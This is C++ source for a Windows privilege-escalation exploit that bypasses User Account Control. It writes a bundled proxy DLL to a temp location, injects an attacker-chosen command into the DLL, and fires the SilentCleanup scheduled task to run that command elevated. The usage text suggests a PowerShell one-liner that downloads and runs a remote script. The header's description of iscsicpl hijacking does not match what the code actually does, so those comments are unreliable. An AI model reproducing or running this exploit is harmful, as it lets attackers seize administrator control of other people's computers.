/* iscsicpl autoelevate DLL Search Order hijacking UAC Bypass
* ===========================================================
* The iscsicpl.exe binary is vulnerable to a DLL Search Order hijacking
* vulnerability when running 32bit Microsoft binary on a 64bit host via
* SysWOW64. The 32bit binary, will perform a search within user %Path%
* for the DLL iscsiexe.dll. This can be exploited using a Proxy DLL to
* execute code via "iscsicpl.exe" as autoelevate is enabled. This exploit
* has been tested against the following versions of Windows desktop:
*
* Windows 11 Enterprise x64 (Version 10.0.22000.739).
* Windows 8.1 Professional x64 (Version 6.3.9600).
*
* -- Hacker Fantastic
* https://hacker.house
*/
#include <iostream>
#include <vector>
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <tchar.h>
#include <wchar.h>
#include <winternl.h>
#define SECURITY_WIN32 1
#include <security.h>
#include "resource.h"
using namespace std;

/* linker lib comment includes for static */
#pragma comment(lib,"User32.lib")
#pragma comment(lib,"AdvApi32.lib")
#pragma comment(lib,"Shell32.lib")
#pragma comment(lib,"Ole32.lib")
#pragma comment(lib,"Oleaut32.lib")
#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"Secur32.lib")

/* program defines for fixed size vars */
#define MAX_ENV_SIZE 32767

/* extract a "DLL" type resource from the PE */
bool ExtractResource(int iId, LPWSTR pDest)
{
	HRSRC aResourceH;
	HGLOBAL aResourceHGlobal;
	unsigned char* aFilePtr;
	unsigned long aFileSize;
	HANDLE file_handle;
	aResourceH = FindResource(NULL, MAKEINTRESOURCE(iId), L"DLL");
	if (!aResourceH)
	{
		return false;
	}
	aResourceHGlobal = LoadResource(NULL, aResourceH);
	if (!aResourceHGlobal)
	{
		return false;
	}
	aFileSize = SizeofResource(NULL, aResourceH);
	aFilePtr = (unsigned char*)LockResource(aResourceHGlobal);
	if (!aFilePtr)
	{
		return false;
	}
	file_handle = CreateFile(pDest, FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (INVALID_HANDLE_VALUE == file_handle)
	{
		int err = GetLastError();
		if ((ERROR_ALREADY_EXISTS == err) || (32 == err))
		{
			return true;
		}
		return false;
	}
	while (aFileSize--)
	{
		unsigned long numWritten;
		WriteFile(file_handle, aFilePtr, 1, &numWritten, NULL);
		aFilePtr++;
	}
	CloseHandle(file_handle);
	return true;
}

/* the main exploit routine */
int main(int argc, char* argv[])
{
	LPWSTR pCMDpath;
	size_t sSize = 0;
	DWORD dwRet;
	BOOL bResult;
	HKEY hUserSID = NULL;
	HKEY hRegKey = NULL;
	HANDLE hToken = NULL;
	DWORD dwErrorCode = 0;
	DWORD dwBufferSize = 0;
	PTOKEN_USER pTokenUser = NULL;
	UNICODE_STRING uStr;
	SHELLEXECUTEINFO shinfo;
	// handle user argument for command
	if (argc != 2) {
		// argument is passed directly to WinExec() via DLL
		printf("[!] Error, you must supply a command e.g. \"powershell iex(iwr http://127.0.0.1:80/crdp.ps1)\"\n");
		return EXIT_FAILURE;
	}
	// multi-byte string to wide char string to convert user command into pCMD
	pCMDpath = new TCHAR[MAX_PATH + 1];
	mbstowcs_s(&sSize, pCMDpath, MAX_PATH, argv[1], strlen(argv[1]));

	// locate %TEMP% environment variable
	LPWSTR pTmpPath = new WCHAR[MAX_ENV_SIZE];
	GetEnvironmentVariable(L"TEMP", pTmpPath, MAX_ENV_SIZE);
	// backup the value of %Path% before overwriting it.
	LPWSTR cRegBackup = new WCHAR[MAX_ENV_SIZE];
	DWORD cRegSize = MAX_ENV_SIZE;
	
	pTmpPath[wcslen(pTmpPath) - 4] = L'\x00';

	// writes the DLL to %TEMP%
	
	LPWSTR pBinPatchPath = new WCHAR[MAX_ENV_SIZE];
	wsprintfW(pBinPatchPath, L"%s\\api-ms-win-core-kernel32-legacy-l1.DLL", pTmpPath);
	

	
	if (ExtractResource(IDR_DLLPROXY, pBinPatchPath))
	{
		// string table structure creation hack using wstring's for user command
		wstring data[7] = { L"", L"", L"", L"", L"", (wstring)pCMDpath, L""};
		vector< WORD > buffer;
		for (size_t index = 0; index < sizeof(data) / sizeof(data[0]); index++)
		{
			size_t pos = buffer.size();
			buffer.resize(pos + data[index].size() + 1);
			buffer[pos++] = static_cast<WORD>(data[index].size());
			copy(data[index].begin(), data[index].end(),	buffer.begin() + pos);
		}
		// do not delete the existing resource entries
		HANDLE hPE = BeginUpdateResource(pBinPatchPath, false);
		// overwrite the IDS_CMD101 string table in the payload DLL with user command.
		bResult = UpdateResource(hPE, RT_STRING, MAKEINTRESOURCE(7), MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), reinterpret_cast<void*>(&buffer[0]),buffer.size() * sizeof(WORD));
		bResult = EndUpdateResource(hPE,FALSE);
		// TODO: should also really read %windir% here in case no standard path.
		// executes syswow64 iscsicpl correctly with the new path
		WinExec("schtasks /run /i /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup", SW_HIDE);
	}
	
	
	return EXIT_SUCCESS;
}
